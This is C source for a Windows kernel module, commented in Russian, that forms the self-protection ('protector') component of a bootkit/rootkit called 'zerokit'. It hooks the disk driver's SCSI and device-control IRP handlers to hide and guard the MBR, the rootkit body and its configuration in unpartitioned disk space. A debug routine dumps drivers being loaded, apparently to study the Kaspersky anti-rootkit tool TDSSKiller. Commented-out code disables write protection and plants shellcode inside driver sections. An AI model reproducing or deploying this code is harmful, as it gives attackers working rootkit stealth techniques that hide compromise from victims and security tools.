// В задачи протектора входит:
// 1. Сокрытие своих файлов в системе (виртуальная файловая система).
// 2. Протекция MBR и области на жёстком диске, где хранится буткит, зерокит и конфигурационная область.
// 3. Сокрытие хуков в драйверах: disk.sys, драйвере сетевой карты.
// 4. 

#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "../../mod_shared/headers.h"

#include "mod_protector.c"
#include "mod_protectorApi.c"

#if DBG

psplice_hooker_data_t pDumperHook;

typedef NTSTATUS (*FnMmLoadSystemImage)(PUNICODE_STRING ImageFileName, PUNICODE_STRING NamePrefix, PUNICODE_STRING LoadedBaseName,
    BOOLEAN LoadInSessionSpace, PVOID *ImageHandle, PVOID *ImageBaseAddress);

NTSTATUS driverDumper(PUNICODE_STRING ImageFileName, PUNICODE_STRING NamePrefix, PUNICODE_STRING LoadedBaseName,
                      BOOLEAN LoadInSessionSpace, PVOID *ImageHandle, PVOID *ImageBaseAddress)
{
    NTSTATUS st;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hDriver = NULL;
    FILE_STANDARD_INFORMATION FileInfo;
    uint8_t* pReadBuff;
    USE_GLOBAL_BLOCK

    do {
        InitializeObjectAttributes(&oa, ImageFileName, OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE, NULL, NULL);

        st = ZwCreateFile(&hDriver, GENERIC_READ, &oa, &iosb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, 
        FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); 
        if (st == STATUS_SUCCESS) {
            st = ZwQueryInformationFile(hDriver,&iosb,&FileInfo,sizeof(FILE_STANDARD_INFORMATION),FileStandardInformation);
            if (st != STATUS_SUCCESS) {
                break;
            }

            pReadBuff = ExAllocatePoolWithTag(NonPagedPool,FileInfo.EndOfFile.LowPart, LOADER_TAG);

            memset( pReadBuff, 0, FileInfo.EndOfFile.LowPart );

            st = ZwReadFile(hDriver,NULL,NULL,NULL,&iosb,pReadBuff,FileInfo.EndOfFile.LowPart,0,0);
            if (st != STATUS_SUCCESS) {
                break;
            }

            pGlobalBlock->pCommonBlock->fncommon_save_file("\\??\\C:\\tdsskiller.sys", pReadBuff, FileInfo.EndOfFile.LowPart);
        }
    } while (0);

    if (hDriver != NULL) {
        ZwClose(hDriver);
    }
    //KIS driver device: \Device\KLMD16012012_207010

//     // Ищем базу драйвера.
//     llDriverBase = pGlobalBlock->pCommonBlock->fnfindModuleBaseByInnerPtr((uint8_t*)pDevObj->DriverObject->DriverInit);
//     dosHdr = (PIMAGE_DOS_HEADER)llDriverBase;
//     ntHdr = (PIMAGE_NT_HEADERS)(llDriverBase + dosHdr->e_lfanew);
//     
//     pGlobalBlock->pCommonBlock->fncommon_save_file("\\??\\C:\\tdsskiller.sys", llDriverBase, ntHdr->OptionalHeader.SizeOfImage);

    //PDEVICE_OBJECT  DeviceObject
    return ((FnMmLoadSystemImage)pDumperHook->fnOrig)(ImageFileName, NamePrefix, LoadedBaseName, LoadInSessionSpace, ImageHandle, ImageBaseAddress);
}

#endif

void protector_critical_callback(psplice_hooker_data_t pHookerData)
{
    uint32_t i;
    pdisk_info_t pDiskInfo;
    USE_GLOBAL_BLOCK

    pDiskInfo = pGlobalBlock->pCommonBlock->pBootDiskInfo;

    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; ++i) {
        if (pDiskInfo->pLowerDevice->DriverObject->MajorFunction[i] == (FnMajorFunction)pHookerData->pOrigFunc) {
            pGlobalBlock->pProtectorBlock->majorFunctions[i] = (FnMajorFunction)pHookerData->fnOrig;
        }
    }
}

NTSTATUS mod_protectorEntry(uintptr_t modBase, pglobal_block_t pGlobalBlock)
{
    pmod_common_block_t pCommonBlock = pGlobalBlock->pCommonBlock;
    pmod_protector_block_t pProtectorBlock;
    pmod_header_t pModHeader = (pmod_header_t)modBase;
    pdisk_info_t pDiskInfo;
    uint32_t bytesPerSector, sizeOfData;
    uint64_t offset;
    
    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pProtectorBlock, sizeof(mod_protector_block_t), NonPagedPool);
    pGlobalBlock->pProtectorBlock = pProtectorBlock;
    pProtectorBlock->pModBase = (uint8_t*)modBase;

#ifndef _SOLID_DRIVER
    
#ifdef _WIN64
    pCommonBlock->fncommon_fix_addr_value((PUINT8)getGlobalDataPtr, 11, GLOBAL_DATA_PATTERN, pGlobalBlock);
#else
    pCommonBlock->fncommon_fix_addr_value((PUINT8)modBase + sizeof(mod_header_t), pModHeader->sizeOfModReal, GLOBAL_DATA_PATTERN, pGlobalBlock);
#endif // _WIN64

#endif // _SOLID_DRIVER

    DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_critical_callback);
    DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_shutdown_routine);
    DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_irp_internal_devctl_hook);
//     DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_scsi_irp_hook);
    DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_irp_devctl_hook);
//     DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_level1_irp_hook);
//     DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_read_irp_hook);
//     DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_write_irp_hook);
//     DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_devctl_irp_hook);

    DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_common);
    DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_irp_completion_routine);

    DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_add_sector_space);
    DECLARE_GLOBAL_FUNC(pProtectorBlock, protector_release);

//     pProtectorBlock->fnregion_mbr_accessed = (FnRegionAccessed)((uint8_t*)region_mbr_accessed
// #ifndef _WIN64
//         + MOD_BASE
// #endif // _WIN64
//         );
//     
    {
//         uint8_t *ptr1, *ptr2;
// 
//         ptr1 = (PUCHAR)pProtectorBlock->partMgr; // "\PartMgr"
//         *(((PUINT32)ptr1)++) = 0x0050005c;
//         *(((PUINT32)ptr1)++) = 0x00720061;
//         *(((PUINT32)ptr1)++) = 0x004d0074;
//         *(((PUINT32)ptr1)++) = 0x00720067;
//         *(PUINT16)ptr1 = 0x0000;
// 
//         ptr1 = (PUCHAR)pProtectorBlock->hdVol1; // "\Device\HarddiskVolume1"
//         *(((PUINT32)ptr1)++) = 0x0044005c;
//         *(((PUINT32)ptr1)++) = 0x00760065;
//         *(((PUINT32)ptr1)++) = 0x00630069;
//         *(((PUINT32)ptr1)++) = 0x005c0065;
//         *(((PUINT32)ptr1)++) = 0x00610048;
//         *(((PUINT32)ptr1)++) = 0x00640072;
//         *(((PUINT32)ptr1)++) = 0x00690064;
//         *(((PUINT32)ptr1)++) = 0x006b0073;
//         *(((PUINT32)ptr1)++) = 0x006f0056;
//         *(((PUINT32)ptr1)++) = 0x0075006c;
//         *(((PUINT32)ptr1)++) = 0x0065006d;
//         *(PUINT32)ptr1 = 0x00000031;


        pGlobalBlock->pCommonBlock->fncommon_initialize_list_head((PLIST_ENTRY)&pProtectorBlock->headSectorRegion);
// #if DBG
//         {
// //            dissasm_info_t hde;
//             uint8_t* ptr = pGlobalBlock->pCommonBlock->ntkernelBase;
//             uint8_t* end = ptr + pGlobalBlock->pCommonBlock->ntkernelSize;
//             uint8_t* funcAddr;
//             uint8_t sigXP_SP3_x32[] = {0x68,0x74,0x01,0x00,0x00,0x68,0x88,0x93,0x4d,0x80,0xe8,0xbd,0x46,0xf9,0xff,0xc7,0x45,0xb8,0xfe,0xff,0xff,0xff,0x83,0x4d,0xdc,0xff};
// 
// // Windows XP x32 SP3
// // nt!MmLoadSystemImage:
// //                 6874010000      push    174h
// //                 6888934d80      push    offset nt!MMTEMPORARY+0xac (804d9388)
// //                 e8bd46f9ff      call    nt!_SEH_prolog (80537fb0)
// //                 c745b8feffffff  mov     dword ptr [ebp-48h],0FFFFFFFEh
// //                 834ddcff        or      dword ptr [ebp-24h],0FFFFFFFFh
// //                 33f6            xor     esi,esi
// //                 8975c4          mov     dword ptr [ebp-3Ch],esi
// //                 8975b0          mov     dword ptr [ebp-50h],esi
// //                 8975b4          mov     dword ptr [ebp-4Ch],esi
// //                 89b560ffffff    mov     dword ptr [ebp-0A0h],esi
// //                 830d04c8548001  or      dword ptr [nt!MiFirstDriverLoadEver (8054c804)],1
// //                 684d6d4c6e      push    6E4C6D4Dh
// //                 6800010000      push    100h
// 
// 
//             for ( ; ptr < end; ++ptr) {
//                 if (memcmp(ptr, sigXP_SP3_x32, sizeof(sigXP_SP3_x32)) == 0) {
//                     break;
//                 }
//             }
// 
// //             __stosb((uint8_t*)&hde, 0, sizeof(hde));
// //             for ( ; ; ptr += hde.len) {
// //                 pGlobalBlock->pDissasmBlock->fndissasm(ptr, &hde);
// // 
// //                 if (hde.len == 1 && hde.opcode == 0x50) {
// //                     pGlobalBlock->pDissasmBlock->fndissasm(++ptr, &hde);
// //                     if (hde.len == 5 && hde.opcode == 0xE8) {
// //                         break;
// //                     }
// //                 }
// //             }
// 
//             //Дампер файлов
//             pDumperHook = pGlobalBlock->pDissasmBlock->fndissasm_install_hook(NULL, ptr, (uint8_t*)driverDumper, FALSE, NULL, NULL);
//         }
// #endif // DBG

        // Защищаем бутсектор и тело в неразмеченной области.
        // Тело условно можно разделить на три части:
        // 1. Тело буткита (без оригинального сектора).
        // 2. Тело зерокита, включая 32-битную и 64-битную версии.
        // 3. Конфигурационная область.
        // Каждую из трёх областей необходимо защищать отдельно.

        bytesPerSector = pGlobalBlock->pCommonBlock->pBootDiskInfo->bytesPerSector;

        pProtectorBlock->hVBRRegion = pProtectorBlock->fnprotector_add_sector_space(pGlobalBlock->pCommonBlock->pBootDiskInfo, pGlobalBlock->pCommonBlock->activeVBROffset, bytesPerSector, NULL, pGlobalBlock->pCommonBlock->activeVBR);

        sizeOfData = pGlobalBlock->pCommonBlock->zerokitHeader.sizeOfPack /*- bytesPerSector*/;
        offset = pGlobalBlock->pCommonBlock->bodySecOffset /*+ bytesPerSector*/;
        pProtectorBlock->hZkRegion = pProtectorBlock->fnprotector_add_sector_space(pGlobalBlock->pCommonBlock->pBootDiskInfo, offset, sizeOfData, NULL, NULL);

        offset += sizeOfData;
        sizeOfData = pGlobalBlock->pCommonBlock->zerokitHeader.sizeOfConfig;
        pProtectorBlock->hConfRegion = pProtectorBlock->fnprotector_add_sector_space(pGlobalBlock->pCommonBlock->pBootDiskInfo, offset, sizeOfData, NULL, NULL);
    }

    // В случае, когда системный диск отличается от загрузочного, необходимо установить хуки на оба диска.
    pDiskInfo = pGlobalBlock->pCommonBlock->pBootDiskInfo;

    // Для полноценной защиты бутсектора и своего тела в неразмеченной области будем перехватывать следующие IRP запросы на нескольких уровнях.
    // Уровень disk.sys (или уровень 1):
    // - IRP_MJ_READ
    // - IRP_MJ_WRITE
    // - IRP_MJ_DEVICE_CONTROL
    //   - IOCTL_IDE_PASS_THROUGH 
    //   - IOCTL_ATA_PASS_THROUGH (http://msdn.microsoft.com/en-us/library/ff559309%28v=vs.85%29.aspx)
    //   - IOCTL_ATA_PASS_THROUGH_DIRECT (http://msdn.microsoft.com/en-us/library/ff559315%28v=vs.85%29.aspx)
    //   - IOCTL_SCSI_PASS_THROUGH (http://msdn.microsoft.com/en-us/library/ff560519%28v=vs.85%29.aspx)
    //   - IOCTL_SCSI_PASS_THROUGH_DIRECT (http://msdn.microsoft.com/en-us/library/ff560521%28v=vs.85%29.aspx)
    //
    // Уровень драйверов (или уровень 2) atapi.sys (ataport.sys), scsi.sys и других аналогичных вариантов:
    // - IRP_MJ_SCSI = IRP_MJ_INTERNAL_DEVICE_CONTROL
    //   - SRB_FUNCTION_EXECUTE_SCSI
    //     - SCSIOP_READ
    //     - SCSIOP_WRITE
    // - DriverStartIo
    //   - SRB_FUNCTION_EXECUTE_SCSI
    //     - SCSIOP_READ
    //     - SCSIOP_WRITE

    // Устанавливаем хуки 1-го уровня.
    if (pDiskInfo != NULL) {
//         if (pDiskInfo->pDeviceObject != NULL) {
//             PDRIVER_DISPATCH pDevCtlMajorFunc = pDiskInfo->pDeviceObject->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];
// //             // Устанавливаем хук на процедуру чтения данных (IRP_MJ_READ).
// //             pProtectorBlock->pReadIrpHook = pGlobalBlock->pDissasmBlock->fndissasm_install_hook(NULL, (uint8_t*)pDiskInfo->pDeviceObject->DriverObject->MajorFunction[IRP_MJ_READ], (uint8_t*)pGlobalBlock->pProtectorBlock->fnprotector_read_irp_hook, FALSE, NULL, NULL);
// //             
// //             if (pDiskInfo->pDeviceObject->DriverObject->MajorFunction[IRP_MJ_READ] != pDiskInfo->pDeviceObject->DriverObject->MajorFunction[IRP_MJ_WRITE]) {
// //                 pProtectorBlock->pWriteIrpHook = pGlobalBlock->pDissasmBlock->fndissasm_install_hook(NULL, (uint8_t*)pDiskInfo->pDeviceObject->DriverObject->MajorFunction[IRP_MJ_WRITE], (uint8_t*)pGlobalBlock->pProtectorBlock->fnprotector_write_irp_hook, FALSE, NULL, NULL);
// //             }
// //             else {
// //                 pProtectorBlock->pWriteIrpHook = pProtectorBlock->pReadIrpHook;
// //             }
// 
//             if (pDevCtlMajorFunc != NULL) {
// //                 if (pDevCtlMajorFunc == pDiskInfo->pDeviceObject->DriverObject->MajorFunction[IRP_MJ_WRITE]) {
// //                     pProtectorBlock->pDevCtlIrpHook = pProtectorBlock->pWriteIrpHook;
// //                 }
// //                 else if (pDevCtlMajorFunc == pDiskInfo->pDeviceObject->DriverObject->MajorFunction[IRP_MJ_READ]) {
// //                     pProtectorBlock->pDevCtlIrpHook = pProtectorBlock->pReadIrpHook;
// //                 }
// //                 else {
//                     pProtectorBlock->pDevCtlIrpHook = pGlobalBlock->pDissasmBlock->fndissasm_install_hook(NULL, (uint8_t*)pDevCtlMajorFunc, (uint8_t*)pGlobalBlock->pProtectorBlock->fnprotector_devctl_irp_hook, 0, NULL, NULL);
// //                 }
//             }
//         }

        // Устанавливаем хуки 2-го уровня.
        if (pDiskInfo->pLowerDevice != NULL) {
//             FnMajorFunction fnMajorFunction;
//             uint8_t* llDriverBase;
//             PIMAGE_DOS_HEADER dosHdr;
//             PIMAGE_NT_HEADERS ntHdr;
//             PIMAGE_SECTION_HEADER sectHdr, nextSectHdr;
//             UINT16 i, sectionNum;
//             bool_t installedHooks = FALSE;
//             uint32_t codeSize = ((uint32_t)((uint8_t*)protector_level2_irp_hook_end - (uint8_t*)protector_level2_irp_hook) + 16) & 0xFFFFFFF0;
//             uint32_t neededSpace = (codeSize + sizeof(splice_hooker_data_t) + 24);
// //             bool_t haveStartIoRoutine = pDiskInfo->pLowerDevice->DriverObject->DriverStartIo != NULL;
// 
//             // Ищем базу драйвера.
//             llDriverBase = pGlobalBlock->pCommonBlock->fnfindModuleBaseByInnerPtr((uint8_t*)pDiskInfo->pLowerDevice->DriverObject->MajorFunction[IRP_MJ_SCSI]);
//             dosHdr = (PIMAGE_DOS_HEADER)llDriverBase;
//             ntHdr = (PIMAGE_NT_HEADERS)(llDriverBase + dosHdr->e_lfanew);
//             sectHdr = IMAGE_FIRST_SECTION(ntHdr);
//             sectionNum = ntHdr->FileHeader.NumberOfSections;
// 
//             if (pGlobalBlock->osMajorVersion > 5) {
//                 for (i = 0; i < sectionNum; ++i) {
//                     if ((sectHdr->Characteristics  & (IMAGE_SCN_MEM_NOT_PAGED | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE)) == 
//                         (IMAGE_SCN_MEM_NOT_PAGED | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE)) {
//                         nextSectHdr = sectHdr + 1;
//                         if (nextSectHdr->VirtualAddress - (sectHdr->VirtualAddress + sectHdr->SizeOfRawData) >= neededSpace) {
//                             uint8_t* shellCode = llDriverBase + sectHdr->VirtualAddress + sectHdr->SizeOfRawData;
//                             uint8_t* hookFuncPtr = shellCode;// + (uint32_t)((uint8_t*)protector_scsi_irp_hook - (uint8_t*)protector_level2_irp_hook);
//                             uint32_t allocatedSize = 0;
// 
//                             pGlobalBlock->pCommonBlock->fncommon_disable_wp();
// 
//                             __movsb(shellCode, (uint8_t*)pGlobalBlock->pProtectorBlock->fnprotector_level2_irp_hook, codeSize);
//                             shellCode += codeSize;
// 
//                             pProtectorBlock->pScsiIrpHook = pGlobalBlock->pDissasmBlock->fndissasm_install_hook(NULL, (pvoid_t)pDiskInfo->pLowerDevice->DriverObject->MajorFunction[IRP_MJ_SCSI], hookFuncPtr, FALSE, shellCode, &allocatedSize);
// //                             if (haveStartIoRoutine) {
// //                                 if (pDiskInfo->pLowerDevice->DriverObject->DriverStartIo != pDiskInfo->pLowerDevice->DriverObject->MajorFunction[IRP_MJ_SCSI]) {
// //                                     hookFuncPtr += (uint32_t)((uint8_t*)protector_fastio_irp_hook - (uint8_t*)protector_scsi_irp_hook);
// //                                     shellCode += allocatedSize;
// //                                     pProtectorBlock->pDrvStartIoHook = pGlobalBlock->pDissasmBlock->fndissasm_install_hook(NULL, (uint8_t*)pDiskInfo->pLowerDevice->DriverObject->DriverStartIo, hookFuncPtr, FALSE, shellCode, &allocatedSize);
// //                                 }
// //                             }
// 
//                             pGlobalBlock->pCommonBlock->fncommon_enable_wp();
//                             installedHooks = TRUE;
//                             break;
//                         }
//                     }
//                     ++sectHdr;
//                 }
//             }
//             else {
//                 WP_GLOBALS wpGlobals;
//                 for (i = 0; i < sectionNum; ++i, ++sectHdr) {
//                     if (sectHdr->Name[0] == 'I' && sectHdr->Name[1] == 'N' && sectHdr->Name[2] == 'I' && sectHdr->Name[3] == 'T' &&
//                         (sectHdr->Characteristics & IMAGE_SCN_CNT_CODE)) {
//                         uint8_t* shellCode = llDriverBase + sectHdr->VirtualAddress;
//                         uint8_t* hookFuncPtr;
//                         uint32_t allocatedSize = 0;
// 
//                         MmLockPagableCodeSection(shellCode);
// //                         wpGlobals.pMDL = pGlobalBlock->pCommonBlock->fnIoAllocateMdl(shellCode, sectHdr->SizeOfRawData, FALSE, FALSE, NULL);
// //                         pGlobalBlock->pCommonBlock->fnMmProbeAndLockPages(wpGlobals.pMDL, KernelMode, IoWriteAccess);
// //                         shellCode = wpGlobals.ptr = pGlobalBlock->pCommonBlock->fnMmMapLockedPagesSpecifyCache(wpGlobals.pMDL, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);
//                         //pGlobalBlock->pCommonBlock->fnMmBuildMdlForNonPagedPool(wpGlobals.pMDL);
//                         //wpGlobals.pMDL->MdlFlags = wpGlobals.pMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
// //                        shellCode = wpGlobals.ptr = pGlobalBlock->pCommonBlock->fnMmMapLockedPages(wpGlobals.pMDL, KernelMode);
// 
//                         hookFuncPtr = shellCode + (uint32_t)((uint8_t*)protector_scsi_irp_hook - (uint8_t*)protector_level2_irp_hook);
// 
//                         //pGlobalBlock->pCommonBlock->fncommon_disable_wp();
// 
//                         __movsb(shellCode, (uint8_t*)pGlobalBlock->pProtectorBlock->fnprotector_level2_irp_hook, codeSize);
//                         shellCode += codeSize;
// 
//                         pProtectorBlock->pScsiIrpHook = pGlobalBlock->pDissasmBlock->fndissasm_install_hook(NULL, (pvoid_t)pDiskInfo->pLowerDevice->DriverObject->MajorFunction[IRP_MJ_SCSI], hookFuncPtr, FALSE, shellCode, &allocatedSize);
//                         if (haveStartIoRoutine) {
//                             if (pDiskInfo->pLowerDevice->DriverObject->DriverStartIo != pDiskInfo->pLowerDevice->DriverObject->MajorFunction[IRP_MJ_SCSI]) {
//                                 hookFuncPtr += (uint32_t)((uint8_t*)protector_fastio_irp_hook - (uint8_t*)protector_scsi_irp_hook);
//                                 shellCode += allocatedSize;
//                                 pProtectorBlock->pDrvStartIoHook = pGlobalBlock->pDissasmBlock->fndissasm_install_hook(NULL, (uint8_t*)pDiskInfo->pLowerDevice->DriverObject->DriverStartIo, hookFuncPtr, FALSE, shellCode, &allocatedSize);
//                             }
//                         }
// 
//                         //pGlobalBlock->pCommonBlock->fncommon_enable_wp();
//                         installedHooks = TRUE;
//                     }
//                 }
//             }

            pProtectorBlock->pIrpInternalDevCtlHook = pGlobalBlock->pCommonBlock->fndissasm_install_hook(NULL, (uint8_t*)pDiskInfo->pLowerDevice->DriverObject->MajorFunction[IRP_MJ_SCSI], (uint8_t*)pGlobalBlock->pProtectorBlock->fnprotector_irp_internal_devctl_hook, FALSE, NULL, NULL, pProtectorBlock->fnprotector_critical_callback);

            if (pDiskInfo->pLowerDevice->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] != pDiskInfo->pLowerDevice->DriverObject->MajorFunction[IRP_MJ_SCSI]) {
                pProtectorBlock->pIrpDevCtlHook = pGlobalBlock->pCommonBlock->fndissasm_install_hook(NULL, (uint8_t*)pDiskInfo->pLowerDevice->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL], (uint8_t*)pGlobalBlock->pProtectorBlock->fnprotector_irp_devctl_hook, FALSE, NULL, NULL, pProtectorBlock->fnprotector_critical_callback);
            }
            else {
                pProtectorBlock->pIrpDevCtlHook = pProtectorBlock->pIrpInternalDevCtlHook;
            }
        }
    }

    return STATUS_SUCCESS;
}
